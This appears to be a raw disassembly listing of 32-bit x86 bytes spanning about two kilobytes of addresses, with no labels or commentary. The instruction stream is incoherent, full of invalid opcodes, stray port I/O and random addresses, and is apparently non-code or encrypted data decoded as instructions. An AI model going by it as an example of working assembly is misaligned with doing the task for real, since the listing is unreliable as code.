  4101d0:	cmp    DWORD PTR [ecx],edx
  4101d2:	add    al,0xad
  4101d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101d5:	clc    
  4101d6:	shr    BYTE PTR [ecx-0x23],1
  4101d9:	mov    al,0x18
  4101db:	outs   dx,DWORD PTR ds:[esi]
  4101dc:	xchg   edx,eax
  4101dd:	mov    ds:0xc92a227e,al
  4101e2:	push   0xe8737a20
  4101e7:	ds scas eax,DWORD PTR es:[edi]
  4101e9:	lock nop
  4101eb:	jns    0x4101cc
  4101ed:	retf   0xe831
  4101f0:	xor    edx,DWORD PTR [esi]
  4101f2:	xlat   BYTE PTR ds:[ebx]
  4101f3:	mov    bl,0xfc
  4101f5:	outs   dx,DWORD PTR ds:[esi]
  4101f6:	mov    bl,0x56
  4101f8:	mov    ebp,0xb5a3a9b7
  4101fd:	mov    eax,ds:0xc28a5c59
  410202:	xor    DWORD PTR [esi-0x5ec1733b],ebx
  410208:	and    al,BYTE PTR [edi]
  41020a:	dec    esi
  41020b:	inc    ebx
  41020c:	dec    esp
  41020d:	mov    ebx,0x6cf7b9ac
  410212:	int3   
  410213:	xor    esi,ecx
  410215:	test   al,0x2f
  410217:	mov    ebx,0xd493ac16
  41021c:	dec    edx
  41021d:	mov    ch,0xa8
  41021f:	cmp    DWORD PTR [edi+0x21],edx
  410222:	gs sub eax,0xa2ad3b7e
  410228:	es popa 
  41022a:	les    edx,FWORD PTR [ebp+0x37]
  41022d:	mov    bh,BYTE PTR [edi+ecx*4+0x32]
  410231:	rcl    eax,1
  410233:	out    dx,al
  410234:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410235:	dec    ecx
  410236:	daa    
  410237:	bound  esi,QWORD PTR [edx-0x60]
  41023a:	or     cl,0xeb
  41023d:	jae    0x410226
  41023f:	ret    0xf15a
  410242:	and    al,0xae
  410244:	inc    edi
  410245:	jne    0x410259
  410247:	xchg   esi,eax
  410248:	repz push ds
  41024a:	xor    eax,0xaa5b8e8f
  41024f:	and    DWORD PTR ds:0x30c2359e,edx
  410255:	cmp    DWORD PTR [eax+0x7d7d0a8e],eax
  41025b:	fmul   QWORD PTR [eax]
  41025d:	xor    BYTE PTR [eax-0x80],cl
  410260:	pop    esp
  410261:	test   DWORD PTR [eax-0x6e21a131],edx
  410267:	cmp    BYTE PTR [edx],ah
  410269:	pusha  
  41026a:	push   0xffffffae
  41026c:	or     ecx,DWORD PTR [esi+ebx*4-0x4f9c78]
  410273:	dec    edi
  410274:	mov    cs,WORD PTR [ebx+0x6]
  410277:	jno    0x4102ef
  410279:	rcl    edi,1
  41027b:	out    dx,eax
  41027c:	inc    eax
  41027d:	popa   
  41027e:	mov    eax,0x5c86ca8f
  410283:	hlt    
  410284:	dec    ebx
  410285:	sub    BYTE PTR [ecx+0x60e7d28e],dh
  41028b:	jo     0x4102f2
  41028d:	scas   eax,DWORD PTR es:[edi]
  41028e:	es div dh
  410291:	dec    esi
  410292:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410293:	lahf   
  410294:	xor    ebp,DWORD PTR [edi+0x10c6b610]
  41029a:	stos   BYTE PTR es:[edi],al
  41029b:	xchg   esi,eax
  41029c:	das    
  41029d:	mov    ecx,0x4174b7d3
  4102a2:	or     edx,edx
  4102a4:	sub    edi,0x54d21e6d
  4102aa:	fdiv   DWORD PTR [eax]
  4102ac:	fstp   QWORD PTR [edx+0x4c0d5b22]
  4102b2:	mov    esi,0xf050837
  4102b7:	pusha  
  4102b8:	(bad)  
  4102b9:	pusha  
  4102ba:	xchg   ecx,eax
  4102bb:	xchg   edx,eax
  4102bc:	fild   QWORD PTR [esi+0x7]
  4102bf:	sub    DWORD PTR fs:[ebp-0x7d],edx
  4102c3:	cmp    al,0xe6
  4102c5:	push   edx
  4102c6:	dec    edi
  4102c7:	aas    
  4102c8:	mov    esi,0xd44483d1
  4102cd:	xchg   esi,eax
  4102ce:	sub    dl,BYTE PTR fs:[edi]
  4102d1:	je     0x4102d5
  4102d3:	or     al,0xf5
  4102d5:	pop    ss
  4102d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102d7:	push   ecx
  4102d8:	imul   ebp,DWORD PTR [ebx+0x39],0x3cf37b1f
  4102df:	ret    
  4102e0:	pop    ebx
  4102e1:	iret   
  4102e2:	fistp  WORD PTR [ecx+esi*4-0x6b]
  4102e6:	out    0xfa,eax
  4102e8:	mov    ds:0xbf9365bd,eax
  4102ed:	ins    BYTE PTR es:[edi],dx
  4102ee:	hlt    
  4102ef:	jbe    0x4102b6
  4102f1:	dec    DWORD PTR [ecx]
  4102f3:	sub    cl,BYTE PTR ds:[esi]
  4102f6:	mov    eax,0xf30b81c
  4102fb:	mov    ?,WORD PTR ds:0xfcf23b0
  410301:	jnp    0x410329
  410303:	adc    BYTE PTR [edi],dh
  410305:	dec    ebx
  410306:	add    eax,0xc1e2c26d
  41030b:	sbb    ebx,eax
  41030d:	in     al,dx
  41030e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41030f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410310:	popa   
  410311:	int    0x50
  410313:	jnp    0x41034e
  410315:	jne    0x410383
  410317:	mov    bl,0x9
  410319:	adc    al,0x12
  41031b:	scas   al,BYTE PTR es:[edi]
  41031c:	dec    edx
  41031d:	mov    dl,0x50
  41031f:	cmp    al,0x0
  410321:	jmp    0x41037c
  410323:	(bad)  
  410324:	ins    BYTE PTR es:[edi],dx
  410325:	shl    DWORD PTR [ebp+0x6e],0x25
  410329:	loop   0x4102b5
  41032b:	bnd ja 0x4103a6
  41032e:	jb     0x4102b7
  410330:	add    DWORD PTR [ebx+0x667fd2b0],eax
  410336:	adc    al,0xb7
  410338:	pusha  
  410339:	out    dx,al
  41033a:	and    dh,BYTE PTR [esi+0x44]
  41033d:	xor    DWORD PTR [ebx-0x61],eax
  410340:	cld    
  410341:	std    
  410342:	popf   
  410343:	and    edi,DWORD PTR [edi-0x2b]
  410346:	lds    eax,FWORD PTR [ecx-0x54]
  410349:	loope  0x410313
  41034b:	cmp    BYTE PTR [ecx-0x3a0d1b06],bh
  410351:	dec    ebp
  410352:	inc    ebp
  410353:	mov    ebx,ds
  410355:	ss test al,0x99
  410358:	ins    DWORD PTR es:[edi],dx
  410359:	pop    esp
  41035a:	and    al,BYTE PTR [edx]
  41035c:	int    0x64
  41035e:	cwde   
  41035f:	sbb    al,0x2d
  410361:	ss adc edx,DWORD PTR es:[ebx+0x1b126e88]
  410369:	xchg   ecx,eax
  41036a:	push   ss
  41036b:	jmp    0x41034e
  41036d:	rcr    DWORD PTR [ecx+0xd],cl
  410370:	sub    al,0xf
  410372:	jecxz  0x410394
  410374:	jne    0x410344
  410376:	mov    ds:0x93689f80,al
  41037b:	daa    
  41037c:	sbb    DWORD PTR ds:0xd394e9fa,edx
  410382:	inc    edi
  410383:	(bad)  
  410384:	cli    
  410385:	hlt    
  410386:	(bad)  
  410387:	xchg   ebx,eax
  410388:	push   eax
  410389:	pop    edi
  41038a:	fstp   TBYTE PTR [eax+0x67e2e2dc]
  410390:	mov    al,ds:0x96343ab0
  410395:	dec    edx
  410396:	sti    
  410397:	out    0xe3,al
  410399:	fs repnz push edi
  41039c:	sbb    bh,BYTE PTR [ebx]
  41039e:	push   0x227010d8
  4103a3:	sub    DWORD PTR [edi-0x62],eax
  4103a6:	mov    dl,0x99
  4103a8:	push   ecx
  4103a9:	cmp    ebx,esi
  4103ab:	ror    DWORD PTR [edi],0x13
  4103ae:	add    ecx,edx
  4103b0:	jecxz  0x4103bf
  4103b2:	mov    al,0x82
  4103b4:	xchg   esi,eax
  4103b5:	cmp    eax,ecx
  4103b7:	jbe    0x41035e
  4103b9:	das    
  4103ba:	or     ah,ch
  4103bc:	or     BYTE PTR [edi],bh
  4103be:	or     DWORD PTR [edx+0x5d],ebp
  4103c1:	xlat   BYTE PTR ds:[ebx]
  4103c2:	ficomp WORD PTR ds:[eax+ebx*2+0x6a]
  4103c7:	call   0x2673a3ff
  4103cc:	imul   esi,DWORD PTR [esi+0x67cbfffb],0x4f
  4103d3:	jns    0x410410
  4103d5:	cmc    
  4103d6:	sub    esp,DWORD PTR [ebx-0x50a0ba7]
  4103dc:	popf   
  4103dd:	pop    eax
  4103de:	hlt    
  4103df:	lea    edx,[edx]
  4103e1:	mov    dl,BYTE PTR [eax-0x4d]
  4103e4:	inc    ecx
  4103e5:	frndint 
  4103e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103e8:	xchg   BYTE PTR [ecx+0x64],al
  4103eb:	jp     0x4103db
  4103ed:	sbb    cl,BYTE PTR [esi-0x2c]
  4103f0:	dec    ebp
  4103f1:	imul   edi,DWORD PTR [ecx+0x3ce4c607],0xfffffff2
  4103f8:	and    ebp,DWORD PTR [edi]
  4103fa:	hlt    
  4103fb:	and    dh,0x5c
  4103fe:	cmp    dh,BYTE PTR [eax]
  410400:	test   DWORD PTR [ebp-0x53],ebp
  410403:	nop
  410404:	ins    DWORD PTR es:[edi],dx
  410405:	ret    
  410406:	(bad)  
  410407:	or     eax,DWORD PTR [ebx+0x56f64983]
  41040d:	or     DWORD PTR [ebx+ebp*4],edx
  410410:	dec    esp
  410411:	sub    eax,0x370468c8
  410416:	scas   al,BYTE PTR es:[edi]
  410417:	jbe    0x4103a9
  410419:	mov    ah,dh
  41041b:	ss int3 
  41041d:	cdq    
  41041e:	mov    eax,ds:0xba8e0f84
  410423:	and    al,BYTE PTR [esi-0x39]
  410426:	fild   QWORD PTR [ecx]
  410428:	mov    ch,0x11
  41042a:	sbb    DWORD PTR [edi+0x47],0xafdc303a
  410431:	(bad)  
  410432:	jae    0x4103c4
  410434:	fadd   QWORD PTR [ebx-0x6a8e5690]
  41043a:	mov    ds:0x25d93806,al
  41043f:	xor    ch,bh
  410441:	out    dx,eax
  410442:	or     eax,0x3a7d730d
  410447:	adc    BYTE PTR [esi-0x77],cl
  41044a:	sub    al,0x4d
  41044c:	mov    ch,0x29
  41044e:	mov    ebp,0x37ce6fd1
  410453:	add    bl,BYTE PTR cs:[edi+eiz*2-0x62e5dff9]
  41045b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41045c:	shl    DWORD PTR [edi+0x3c0e7541],1
  410462:	aaa    
  410463:	fst    st(7)
  410465:	cld    
  410466:	or     esp,DWORD PTR [ebx]
  410468:	dec    ecx
  410469:	xchg   edi,eax
  41046a:	in     eax,0x73
  41046c:	xor    ecx,DWORD PTR [edx]
  41046e:	(bad)  
  41046f:	jbe    0x410430
  410471:	push   0xc
  410473:	dec    edx
  410474:	mov    eax,0x58ce2935
  410479:	bnd jae 0x41044e
  41047c:	sbb    bl,BYTE PTR [edx-0x3]
  41047f:	add    BYTE PTR [ebx],0xda
  410482:	test   BYTE PTR [eax],0xfa
  410485:	jb     0x41044d
  410487:	lds    ebp,FWORD PTR [ecx+0x1b24613a]
  41048d:	adc    eax,0xda948d25
  410492:	in     al,0xb7
  410494:	aad    0x92
  410496:	mov    DWORD PTR [ecx-0x5a2fe92d],ebp
  41049c:	stos   DWORD PTR es:[edi],eax
  41049d:	fld    QWORD PTR [edi+0x22]
  4104a0:	jae    0x410497
  4104a2:	(bad)  [eax-0x55e622b4]
  4104a8:	test   BYTE PTR [ebp-0xda9a762],bh
  4104ae:	arpl   WORD PTR [ecx],sp
  4104b0:	mov    es,WORD PTR [eax]
  4104b2:	fdivr  QWORD PTR [eax-0x19]
  4104b5:	ss mov ebp,0xa110fdcb
  4104bb:	std    
  4104bc:	push   ecx
  4104bd:	jecxz  0x41048a
  4104bf:	das    
  4104c0:	addr16 fbld TBYTE PTR [bp+si-0x7f]
  4104c5:	adc    ecx,ebx
  4104c7:	xor    al,0xa
  4104c9:	jmp    0x3365:0xb89f8afe
  4104d0:	sub    ecx,DWORD PTR [edx-0x5c1be066]
  4104d6:	dec    ebp
  4104d7:	cwde   
  4104d8:	cwde   
  4104d9:	mov    eax,0xa64549cc
  4104de:	sub    esp,DWORD PTR [ebx-0x37]
  4104e1:	loop   0x41053c
  4104e3:	push   esi
  4104e4:	jae    0x410487
  4104e6:	jb     0x41048c
  4104e8:	adc    bl,BYTE PTR [ebp-0x38]
  4104eb:	mov    es,WORD PTR [ebp+0x7cc4f14b]
  4104f1:	fstp   DWORD PTR [edx+0x8]
  4104f4:	add    DWORD PTR [edx],ebx
  4104f6:	pop    ebx
  4104f7:	jno    0x410577
  4104f9:	mov    ah,0x31
  4104fb:	pop    es
  4104fc:	add    al,0xa4
  4104fe:	mov    esi,0x90965c39
  410503:	mov    esp,0x3ecc3bf9
  410508:	retf   0x4175
  41050b:	into   
  41050c:	cdq    
  41050d:	dec    esi
  41050e:	add    eax,0x4b017a5
  410513:	cmp    edx,DWORD PTR [ebp+edi*1+0xc]
  410517:	xchg   ecx,eax
  410518:	push   ecx
  41051a:	sub    BYTE PTR [eax-0x22],0xe2
  41051e:	retf   
  41051f:	jae    0x4104b3
  410521:	mul    DWORD PTR [edx]
  410523:	jns    0x41053c
  410525:	mov    ecx,0x350ad77a
  41052a:	pop    ebx
  41052b:	sbb    bl,BYTE PTR [ecx-0x7e]
  41052e:	mov    gs,ebp
  410530:	aas    
  410531:	cmp    al,0x61
  410533:	mov    esi,0x8a346854
  410538:	xor    ebp,esp
  41053a:	inc    esp
  41053b:	outs   dx,BYTE PTR ds:[esi]
  41053c:	test   edi,eax
  41053e:	add    al,0x42
  410540:	repnz arpl WORD PTR [esi+edx*1-0x35],bx
  410545:	pop    ss
  410546:	test   edx,esi
  410548:	xchg   esp,eax
  410549:	push   ecx
  41054a:	stc    
  41054b:	call   0xb8fc:0x4890fdaa
  410552:	inc    eax
  410553:	dec    edi
  410554:	inc    ebx
  410555:	push   esi
  410556:	in     eax,dx
  410557:	mov    ebx,0xeed3e779
  41055d:	mov    ebx,0x5c0a9376
  410562:	inc    eax
  410563:	dec    ecx
  410564:	jmp    0x4105bd
  410566:	cli    
  410567:	pop    ebp
  410568:	ja     0x410547
  41056a:	xchg   ecx,eax
  41056b:	fwait
  41056c:	clc    
  41056d:	lahf   
  41056e:	cmp    DWORD PTR ds:0x22129b34,edi
  410574:	add    BYTE PTR [edx+0x15],bh
  410577:	shr    DWORD PTR [ebx+0x2057d6dd],0xed
  41057e:	out    dx,eax
  41057f:	mov    bl,BYTE PTR [ecx+0x7747f392]
  410585:	sbb    ah,BYTE PTR [eax+0x18a204df]
  41058b:	pop    ss
  41058c:	push   eax
  41058d:	in     eax,0xc5
  41058f:	test   eax,0x7cce858d
  410594:	push   cs
  410595:	test   cl,bh
  410597:	stc    
  410598:	mov    ?,ebx
  41059a:	cdq    
  41059b:	adc    DWORD PTR [ecx+0xf],ebp
  41059e:	out    dx,al
  41059f:	xchg   edx,eax
  4105a0:	jecxz  0x41053d
  4105a2:	jecxz  0x4105f1
  4105a4:	fst    QWORD PTR [eax-0x6a]
  4105a7:	jp     0x41061a
  4105a9:	pusha  
  4105aa:	stc    
  4105ab:	push   es
  4105ac:	ficom  WORD PTR [edx+0x65]
  4105af:	aas    
  4105b0:	or     BYTE PTR [edx+0x3201307],cl
  4105b6:	pop    ebp
  4105b7:	test   DWORD PTR [ecx-0x1a4e91e2],edi
  4105bd:	xor    edi,ecx
  4105bf:	in     eax,0x92
  4105c1:	inc    ebp
  4105c2:	xchg   DWORD PTR [eax-0x31c01839],ebx
  4105c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105c9:	sti    
  4105ca:	mov    ebp,DWORD PTR [esi]
  4105cc:	(bad)  
  4105cd:	out    0x5d,al
  4105cf:	pop    edi
  4105d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105d1:	xor    BYTE PTR [eax-0x650e0e0b],bh
  4105d7:	mov    esp,0xc0b39836
  4105dc:	xor    eax,edi
  4105de:	repz push eax
  4105e0:	xor    ebp,DWORD PTR [eax+0x7f]
  4105e3:	outs   dx,BYTE PTR ds:[esi]
  4105e4:	push   ebx
  4105e5:	mov    ds:0xc263465e,al
  4105ea:	les    cx,DWORD PTR [ebp+0x6d8acc43]
  4105f1:	push   eax
  4105f2:	mov    ds:0xfb0b52b1,eax
  4105f7:	inc    ebp
  4105f8:	popa   
  4105f9:	xor    eax,DWORD PTR [esi-0x6f]
  4105fc:	sub    dh,BYTE PTR [ecx]
  4105fe:	(bad)  
  4105ff:	pop    ebp
  410600:	out    0xa8,eax
  410602:	add    edx,DWORD PTR [ebx]
  410604:	fdivr  QWORD PTR [ecx+0x5d]
  410607:	mov    al,0xa1
  410609:	leave  
  41060a:	(bad)  
  41060b:	push   0x3e3579aa
  410610:	hlt    
  410611:	sub    dl,BYTE PTR [edi-0x7a9fb5fb]
  410617:	ss adc eax,0x6e997e9c
  41061d:	adc    BYTE PTR [eax-0x71],dl
  410620:	imul   ecx,edx,0x4f719ccf
  410626:	lock (bad) 
  410628:	jg     0x41065e
  41062a:	jge    0x41066c
  41062c:	pop    edx
  41062d:	into   
  41062e:	mov    eax,0xfc74a85c
  410633:	pop    es
  410634:	inc    esi
  410635:	scas   al,BYTE PTR es:[edi]
  410636:	(bad)
  41063a:	out    dx,eax
  41063b:	and    al,0x12
  41063d:	pop    ebx
  41063e:	jns    0x410671
  410640:	mov    ds:0x16ede97f,eax
  410645:	test   dh,0x16
  410648:	mov    ch,dl
  41064a:	push   esp
  41064b:	cmc    
  41064c:	loope  0x4105d0
  41064e:	jmp    0x3397:0xb34fb743
  410655:	mov    ebx,0xb4c2fa91
  41065a:	dec    ecx
  41065b:	mul    BYTE PTR [ebx-0xf1a5bc5]
  410661:	mov    ds:0x1d5b39fd,eax
  410666:	lock es aam 0x5a
  41066a:	hlt    
  41066b:	dec    ecx
  41066c:	outs   dx,BYTE PTR ds:[esi]
  41066d:	pusha  
  41066e:	scas   eax,DWORD PTR es:[edi]
  41066f:	lock and al,0x78
  410672:	in     eax,0x76
  410674:	push   ebx
  410675:	inc    ebx
  410676:	add    DWORD PTR [ebp+0x5680ef2c],0x92c6d92e
  410680:	out    0xf0,al
  410682:	and    al,0x70
  410684:	int3   
  410685:	mov    dh,BYTE PTR [esi-0x6d]
  410688:	pop    ds
  410689:	daa    
  41068a:	test   DWORD PTR [ebp-0x189ba7ce],0x2f330609
  410694:	sub    eax,0x388ae095
  410699:	sub    al,0x1e
  41069b:	mov    WORD PTR [eax+0x38b95c5c],fs
  4106a1:	mov    al,ds:0xaabe2b7c
  4106a6:	and    al,BYTE PTR [edx+edx*4]
  4106a9:	and    al,0xf0
  4106ab:	aad    0x6c
  4106ad:	ja     0x410695
  4106af:	arpl   WORD PTR [esi],sp
  4106b1:	sub    bh,BYTE PTR [esi+edx*2]
  4106b4:	(bad)  
  4106b5:	or     eax,0x2881dc82
  4106ba:	and    esp,DWORD PTR [edx+0x7fbdff48]
  4106c0:	adc    eax,0x13d9c7f5
  4106c5:	xchg   edi,eax
  4106c6:	inc    edx
  4106c7:	(bad)  
  4106c8:	dec    esp
  4106c9:	mov    bh,0x48
  4106cb:	das    
  4106cc:	adc    BYTE PTR [ecx-0x551bdef3],dh
  4106d2:	outs   dx,BYTE PTR ds:[esi]
  4106d3:	mov    ss,WORD PTR [ebp+ecx*8+0x15]
  4106d7:	daa    
  4106d8:	loope  0x410690
  4106da:	mov    al,0x39
  4106dc:	jns    0x4106a9
  4106de:	mov    BYTE PTR [edi-0x33e4ad0a],0x2e
  4106e5:	mov    BYTE PTR [ebx+0x425f13e8],ch
  4106eb:	add    esi,ebp
  4106ed:	dec    edi
  4106ee:	jmp    0x7046:0xadc7edf2
  4106f5:	inc    esi
  4106f6:	and    eax,0xab985aca
  4106fb:	push   cs
  4106fc:	in     al,0x9d
  4106fe:	ds sub esi,edx
  410701:	imul   esp,DWORD PTR [edx],0xffffffd8
  410704:	dec    ecx
  410705:	in     al,dx
  410706:	fucomi st,st(7)
  410708:	lods   eax,DWORD PTR ds:[esi]
  410709:	mov    ebx,0x2faa39cc
  41070e:	cdq    
  41070f:	pop    ds
  410710:	xlat   BYTE PTR ds:[ebx]
  410711:	daa    
  410712:	jp     0x410736
  410714:	mov    ah,0xa9
  410716:	pushf  
  410717:	jg     0x410714
  410719:	leave  
  41071a:	addr16 add eax,0x1259ba9a
  410720:	rol    DWORD PTR [esi],0x5d
  410723:	dec    ecx
  410724:	jo     0x4106af
  410726:	ret    
  410727:	pushf  
  410728:	leave  
  410729:	stos   BYTE PTR es:[edi],al
  41072a:	mov    ecx,esp
  41072c:	in     al,dx
  41072d:	test   BYTE PTR [ebx-0x8791c77],0xb1
  410734:	jp     0x410784
  410736:	inc    ebx
  410737:	jne    0x4106dd
  410739:	shr    DWORD PTR [eax],1
  41073b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41073c:	add    al,0xc4
  41073e:	jmp    0x41070f
  410740:	fistp  DWORD PTR [ebx+0x26]
  410743:	jae    0x410787
  410745:	imul   ecx,esi,0xd3872e5f
  41074b:	push   ecx
  41074c:	inc    eax
  41074d:	dec    ebx
  41074e:	imul   edx,DWORD PTR [eax],0x393de308
  410754:	sbb    ah,cl
  410756:	call   0x367a:0x1d55a3bf
  41075d:	mov    ecx,0x6680e44b
  410762:	mov    dl,0x27
  410764:	push   edx
  410765:	adc    dh,ah
  410767:	push   edx
  410768:	push   0xffffff80
  41076a:	out    dx,al
  41076b:	(bad)  
  41076c:	push   bp
  41076e:	jno    0x410731
  410770:	data16 cmc 
  410772:	jnp    0x410715
  410774:	int    0x21
  410776:	retf   
  410777:	jl     0x41078e
  410779:	push   ebp
  41077a:	adc    al,0xb3
  41077c:	sbb    BYTE PTR [edx-0x2a],bl
  41077f:	xor    edi,DWORD PTR [ebp+0x55ac89ed]
  410785:	xor    eax,0x84fb70f2
  41078a:	push   ebx
  41078b:	and    al,0xd2
  41078d:	bound  esp,QWORD PTR [edx+0x33]
  410790:	fcom   QWORD PTR [edx]
  410792:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410793:	fwait
  410794:	dec    edi
  410795:	les    ebx,FWORD PTR [ebx-0x3b1ea02f]
  41079b:	test   al,0x4f
  41079d:	aas    
  41079e:	leave  
  41079f:	test   al,0xfd
  4107a1:	pop    eax
  4107a2:	gs sti 
  4107a4:	retf   
  4107a5:	stos   DWORD PTR es:[edi],eax
  4107a6:	call   0x2f051d8a
  4107ab:	inc    esp
  4107ac:	push   ebx
  4107ad:	inc    edx
  4107ae:	fist   WORD PTR [ebp-0x5d]
  4107b1:	test   al,0x4b
  4107b3:	xchg   al,dh
  4107b5:	mov    ds:0xf54924a0,al
  4107ba:	adc    DWORD PTR [eax],ebp
  4107bc:	ja     0x410829
  4107be:	loopne 0x4107d4
  4107c0:	dec    ebx
  4107c1:	sub    DWORD PTR [ebp-0x6c],0x55970045
  4107c8:	arpl   WORD PTR ds:0x84366d58,cx
  4107ce:	ins    DWORD PTR es:[edi],dx
  4107cf:	pop    eax
  4107d0:	test   BYTE PTR [edi-0x50151b9c],ch
  4107d6:	and    DWORD PTR [edi-0x45d9894f],eax
  4107dc:	sti    
  4107dd:	cmp    BYTE PTR [ebx-0x1af95233],dh
  4107e3:	arpl   WORD PTR [eax],bx
  4107e5:	pop    edi
  4107e6:	pusha  
  4107e7:	mov    dh,0xa6
  4107e9:	fwait
  4107ea:	popf   
  4107eb:	fidiv  WORD PTR [esi-0x312d8b30]
  4107f1:	shl    BYTE PTR [eax+0x34478954],0x7f
  4107f8:	sbb    eax,0xac766fbf
  4107fd:	dec    esp
  4107fe:	in     eax,dx
  4107ff:	sub    al,0x8
  410801:	sub    DWORD PTR [eax+0x18afc779],ebx
  410807:	imul   ebx,DWORD PTR [ebx-0x10ead74],0xad355444
  410811:	mov    ah,0xa3
  410813:	push   0xffffff98
  410815:	popa   
  410816:	jge    0x41087d
  410818:	lahf   
  410819:	sub    al,0x12
  41081b:	jg     0x4107c0
  41081d:	icebp  
  41081e:	sub    ebx,ebx
  410820:	sbb    BYTE PTR [ebx],0x2a
  410823:	call   DWORD PTR [edx]
  410825:	cs xchg edx,eax
  410827:	lea    esi,[ebp+0x3b]
  41082a:	fsubr  QWORD PTR [esi]
  41082c:	mov    ecx,DWORD PTR [edx-0x6d]
  41082f:	pop    esi
  410830:	in     eax,dx
  410831:	outs   dx,BYTE PTR ds:[esi]
  410832:	xchg   ecx,eax
  410833:	dec    ecx
  410834:	out    0x34,eax
  410836:	sbb    al,0x4
  410838:	push   esi
  410839:	adc    edi,ebx
  41083b:	lds    eax,FWORD PTR [edx+edx*1]
  41083e:	jae    0x410878
  410840:	pop    ebx
  410841:	pop    esi
  410842:	and    al,0xaf
  410844:	fidivr WORD PTR [edx-0x78d20964]
  41084a:	jge    0x410815
  41084c:	test   DWORD PTR [edx],esi
  41084e:	ret    0x4706
  410851:	aam    0x18
  410853:	pop    eax
  410854:	add    al,0x94
  410856:	das    
  410857:	or     eax,0x77b7e3c8
  41085c:	loop   0x4107ec
  41085e:	mov    eax,0x15a48d10
  410863:	push   es
  410864:	leave  
  410865:	dec    esi
  410866:	pop    ebp
  410867:	sbb    DWORD PTR [ebx+0x487b6e8d],esi
  41086d:	add    edx,DWORD PTR [eax]
  41086f:	in     al,dx
  410870:	jno    0x410881
  410872:	pop    ss
  410873:	(bad)  
  410874:	mov    ah,0x53
  410876:	cs loope 0x41086b
  410879:	mov    bh,0xb5
  41087b:	mov    ebx,0x6f814d9e
  410880:	test   al,0xd6
  410882:	or     eax,DWORD PTR [edx-0x23]
  410885:	shl    BYTE PTR [ebx],cl
  410887:	or     BYTE PTR [ebx+0x70c9d4c],bl
  41088d:	push   0x880089
  410892:	cli    
  410893:	mov    esi,0xbe05e4e9
  410898:	add    al,0xa1
  41089a:	or     al,0x9f
  41089c:	mov    ch,0x99
  41089e:	or     dh,bh
  4108a0:	fst    QWORD PTR [ecx-0x71]
  4108a3:	jno    0x41082c
  4108a5:	sub    DWORD PTR [eax],ebx
  4108a7:	mov    ds:0xbc79358e,al
  4108ac:	sbb    dl,ah
  4108ae:	adc    eax,0x7065c448
  4108b3:	mov    dh,0x7b
  4108b5:	mov    ds:0x7564f4dc,al
  4108ba:	ins    BYTE PTR es:[edi],dx
  4108bb:	arpl   WORD PTR [esi-0x11],dx
  4108be:	outs   dx,DWORD PTR ds:[esi]
  4108bf:	fidivr WORD PTR [ecx-0x4d4f89e]
  4108c5:	mov    ds:0x401af6de,al
  4108ca:	lods   al,BYTE PTR ds:[esi]
  4108cb:	(bad)  [edi+0x36ca653f]
  4108d1:	xor    ebp,ebp
  4108d3:	cmp    ecx,esi
  4108d5:	ins    DWORD PTR es:[edi],dx
  4108d6:	xchg   ecx,eax
  4108d7:	mov    esp,ebp
  4108d9:	ja     0x41092c
  4108db:	sub    eax,0x342fa31f
  4108e0:	inc    ecx
  4108e1:	daa    
  4108e2:	scas   al,BYTE PTR es:[edi]
  4108e3:	test   dh,cl
  4108e5:	push   ds
  4108e6:	jnp    0x41090a
  4108e8:	jns    0x4108d6
  4108ea:	ja     0x410887
  4108ec:	jne    0x41093e
  4108ee:	mov    dl,0xb8
  4108f0:	mov    al,0x3a
  4108f2:	dec    edx
  4108f3:	mov    ss,WORD PTR [ecx+0x3b]
  4108f6:	add    al,0x1e
  4108f8:	cwde   
  4108f9:	or     ecx,DWORD PTR [ebx-0x40]
  4108fc:	(bad)  
  4108fe:	cld    
  4108ff:	xchg   ecx,eax
  410900:	das    
  410901:	shl    DWORD PTR [edx-0x750e9e20],1
  410907:	sub    BYTE PTR [edx+0x1b],cl
  41090a:	push   ecx
  41090b:	inc    edx
  41090c:	mov    es,WORD PTR [edi-0x21]
  41090f:	(bad)  
  410911:	adc    eax,DWORD PTR [edx]
  410913:	into   
  410914:	or     eax,0x670e7e75
  410919:	int3   
  41091a:	gs mov bl,0x9
  41091d:	fwait
  41091e:	bound  ebx,QWORD PTR [ecx+0x6684103a]
  410924:	mov    dh,0xad
  410926:	(bad)  
  410927:	(bad)  
  410929:	cmp    bh,ch
  41092b:	pop    edi
  41092c:	retf   0x85e8
  41092f:	mov    esp,0x266d8e44
  410934:	pop    ss
  410935:	pop    esp
  410936:	ret    
  410937:	enter  0x451,0xf2
  41093b:	push   es
  41093c:	cs ds gs out 0xae,eax
  410941:	adc    BYTE PTR [ebp-0x5c0343e8],ch
  410947:	xor    al,0xc0
  410949:	arpl   WORD PTR [ebx],di
  41094b:	shr    edx,cl
  41094d:	ja     0x4109a7
  41094f:	pop    ds
  410950:	frstor [edx+0x4e]
  410953:	jle    0x41098b
  410955:	cld    
  410956:	xlat   BYTE PTR ds:[ebx]
  410957:	dec    ebp
  410958:	mov    edi,0xaa918068
  41095d:	retf   
  41095e:	mov    esi,0xb62dc5b8
  410963:	outs   dx,DWORD PTR ds:[esi]
  410964:	arpl   WORD PTR [edi],di
  410966:	jnp    0x410990
  410968:	add    edx,edi
  41096a:	pop    ds
  41096b:	add    esi,DWORD PTR [ecx]
  41096d:	popa   
  41096e:	mov    ebx,0x1283aa8d
  410973:	or     eax,0x1337d4ce
  410978:	(bad)
  41097c:	jnp    0x4109cf
  41097e:	push   ecx
  41097f:	dec    eax
  410980:	jne    0x41096a
  410982:	mov    esi,0x7b78229e
  410987:	pop    esp
  410988:	mov    al,0xe8
  41098a:	and    eax,0xc528bfd7
  41098f:	mov    ds:0xe18bfdf1,eax
  410994:	or     ebx,DWORD PTR [edx+0x40b0bab3]
  41099a:	mov    ebx,0x9f7c1196
  41099f:	ins    BYTE PTR es:[edi],dx
  4109a0:	jecxz  0x41092f
  4109a2:	sbb    al,0x11
  4109a4:	int3   
  4109a5:	(bad)  
